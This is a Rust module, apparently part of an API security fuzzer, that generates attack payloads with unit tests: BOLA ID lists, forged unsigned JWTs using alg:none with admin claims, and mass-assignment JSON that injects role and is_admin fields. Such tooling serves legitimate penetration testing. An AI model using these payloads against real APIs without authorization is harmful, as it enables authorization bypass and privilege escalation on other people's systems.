pub mod encoder;
pub mod fuzzer;

use rand::Rng;
use serde_json::{Map, Value};

/// Generate BOLA payloads: a mix of sequential integer IDs and random UUIDs.
///
/// Returns a Vec of ID strings ready to substitute into endpoint templates
/// (e.g. `/api/v1/users/{id}`).
pub fn generate_bola_payloads(count: u32) -> Vec<String> {
    let mut payloads = Vec::with_capacity(count as usize);
    let half = count / 2;

    // Sequential integer IDs (first half)
    for i in 1..=half {
        payloads.push(i.to_string());
    }

    // Random UUIDs (second half)
    let mut rng = rand::thread_rng();
    for _ in 0..(count - half) {
        let uuid = format!(
            "{:08x}-{:04x}-4{:03x}-{:04x}-{:012x}",
            rng.gen::<u32>(),
            rng.gen::<u16>(),
            rng.gen::<u16>() & 0x0fff,
            (rng.gen::<u16>() & 0x3fff) | 0x8000,
            rng.gen::<u64>() & 0xffffffffffff_u64,
        );
        payloads.push(uuid);
    }

    payloads
}

/// Generate a JWT token with `alg:none` — signature is stripped entirely.
///
/// `claims` must be a valid JSON object string, e.g. `{"sub":"1","role":"admin"}`.
/// Returns the complete unsigned JWT string: `header.payload.` (empty signature).
pub fn generate_jwt_none_token(claims: &str) -> String {
    use base64::Engine;
    let engine = base64::engine::general_purpose::URL_SAFE_NO_PAD;

    let header = r#"{"alg":"none","typ":"JWT"}"#;
    let encoded_header = engine.encode(header.as_bytes());
    let encoded_payload = engine.encode(claims.as_bytes());

    // alg:none — no signature, but trailing dot must be present
    format!("{}.{}.", encoded_header, encoded_payload)
}

/// Generate a mass assignment payload by taking a base JSON object string
/// and injecting extra fields.
///
/// `base` must be a valid JSON object string.
/// `extra_fields` is a slice of `(key, value)` tuples — values must be valid JSON strings.
///
/// Returns the merged JSON object as a string, or an error string if parsing fails.
pub fn generate_mass_assignment_payload(
    base: &str,
    extra_fields: &[(String, String)],
) -> String {
    let mut obj: Map<String, Value> = match serde_json::from_str(base) {
        Ok(Value::Object(m)) => m,
        _ => Map::new(),
    };

    for (key, raw_value) in extra_fields {
        // Attempt to parse value as JSON; fall back to a JSON string literal
        let value: Value = serde_json::from_str(raw_value)
            .unwrap_or_else(|_| Value::String(raw_value.clone()));
        obj.insert(key.clone(), value);
    }

    serde_json::to_string(&Value::Object(obj))
        .unwrap_or_else(|_| "{}".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bola_payloads_correct_count() {
        let payloads = generate_bola_payloads(10);
        assert_eq!(payloads.len(), 10);
    }

    #[test]
    fn bola_payloads_starts_sequential() {
        let payloads = generate_bola_payloads(6);
        assert_eq!(payloads[0], "1");
        assert_eq!(payloads[1], "2");
        assert_eq!(payloads[2], "3");
    }

    #[test]
    fn jwt_none_has_three_parts() {
        let token = generate_jwt_none_token(r#"{"sub":"1","role":"admin"}"#);
        let parts: Vec<&str> = token.split('.').collect();
        assert_eq!(parts.len(), 3, "JWT must have header.payload.signature parts");
        assert!(parts[2].is_empty(), "alg:none token must have empty signature");
    }

    #[test]
    fn jwt_none_header_decodes_alg_none() {
        use base64::Engine;
        let engine = base64::engine::general_purpose::URL_SAFE_NO_PAD;
        let token = generate_jwt_none_token(r#"{"sub":"1"}"#);
        let header_b64 = token.split('.').next().unwrap();
        let header_json = engine.decode(header_b64).unwrap();
        let header: serde_json::Value = serde_json::from_slice(&header_json).unwrap();
        assert_eq!(header["alg"], "none");
    }

    #[test]
    fn mass_assignment_injects_fields() {
        let base = r#"{"name":"Alice","email":"alice@example.com"}"#;
        let extra = vec![
            ("role".to_string(), r#""admin""#.to_string()),
            ("is_admin".to_string(), "true".to_string()),
        ];
        let result = generate_mass_assignment_payload(base, &extra);
        let v: serde_json::Value = serde_json::from_str(&result).unwrap();
        assert_eq!(v["role"], "admin");
        assert_eq!(v["is_admin"], true);
        assert_eq!(v["name"], "Alice");
    }
}
